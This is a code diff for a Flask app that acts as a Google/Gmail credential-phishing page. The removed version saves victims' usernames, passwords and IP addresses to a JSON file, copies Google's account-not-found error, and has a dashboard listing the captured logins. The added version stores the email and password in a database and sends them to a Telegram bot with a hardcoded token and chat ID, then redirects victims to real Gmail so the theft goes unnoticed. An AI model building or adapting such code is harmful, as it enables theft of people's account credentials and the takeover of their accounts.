@@ -1,66 +1,50 @@
 from flask import Blueprint, render_template, request, redirect
-import json
-from datetime import datetime
-import os
+from app import db
+from app.models import UserLog
 import re
+import telebot
 
-bp = Blueprint('main', __name__)
-DATA_FILE = 'database/logs.json'
+main = Blueprint('main', __name__)
 
-# اطمینان از وجود فایل JSON
-if not os.path.exists(DATA_FILE):
-    with open(DATA_FILE, 'w') as f:
-        json.dump([], f)
+# 📌 Regex برای اعتبارسنجی
+email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+password_regex = r'^.{6,}$'  # حداقل 6 کاراکتر
 
-# Regex برای Gmail فقط
-email_regex = r'^[a-zA-Z0-9._%+-]+@gmail\.com$'
+# 📌 تنوکن_بات_خودت_اینجا"ظیمات بات تلگرام
+BOT_TOKEN = "8227322387:AAE5ydjL2M5WqJZtiJx92va1g1uj8-7FNvI"
+CHAT_ID = "2030813338"
+bot = telebot.TeleBot(BOT_TOKEN)
 
-@bp.route('/', methods=['GET'])
-def index():
-    return render_template('login.html')
-
-@bp.route('/login', methods=['POST'])
+@main.route('/', methods=['GET', 'POST'])
 def login():
-    username = request.form.get('username')
-    password = request.form.get('password')
-    ip = request.remote_addr
-    timestamp = datetime.utcnow().isoformat()
+    error = None
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
 
-    # بررسی معتبر بودن ایمیل
-    if not re.match(email_regex, username):
-        error_msg = "Couldn't find your Google Account. Please try again or create a new account."
-        return render_template('login.html', error=error_msg)
+        # 🔍 اعتبارسنجی
+        if not re.match(email_regex, username):
+            error = "Enter a valid email"
+        elif not re.match(password_regex, password):
+            error = "Incorrect password. Try again."
+        else:
+            # ✅ ذخیره در دیتابیس
+            new_log = UserLog(username=username, password=password)
+            db.session.add(new_log)
+            db.session.commit()
 
-    # خواندن داده‌ها با محافظت در برابر JSONDecodeError
-    with open(DATA_FILE, 'r') as f:
-        try:
-            data = json.load(f)
-        except json.JSONDecodeError:
-            data = []
+            # ✅ ارسال به تلگرام
+            message = (
+                "⚡ Someone just entered data\n\n"
+                f"📧 Email: {username}\n"
+                f"🔑 Password: {password}"
+            )
+            try:
+                bot.send_message(CHAT_ID, message)
+            except Exception as e:
+                print(f"Telegram error: {e}")
 
-    log_entry = {
-        "id": len(data)+1,
-        "username": username,
-        "password": password,
-        "ip": ip,
-        "timestamp": timestamp
-    }
-    data.append(log_entry)
+            # ✅ ریدایرکت به Gmail
+            return redirect("https://mail.google.com/")
 
-    with open(DATA_FILE, 'w') as f:
-        json.dump(data, f, indent=4)
-
-    return redirect("https://mail.google.com")  # ریدایرکت به Gmail واقعی
-
-@bp.route('/dashboard', methods=['GET'])
-def dashboard():
-    with open(DATA_FILE, 'r') as f:
-        try:
-            logs = json.load(f)
-        except json.JSONDecodeError:
-            logs = []
-
-    success_count = len(logs)
-    fail_count = 0
-
-    return render_template('dashboard.html', logs=logs, success_count=success_count, fail_count=fail_count)
+    return render_template('login.html', error=error)
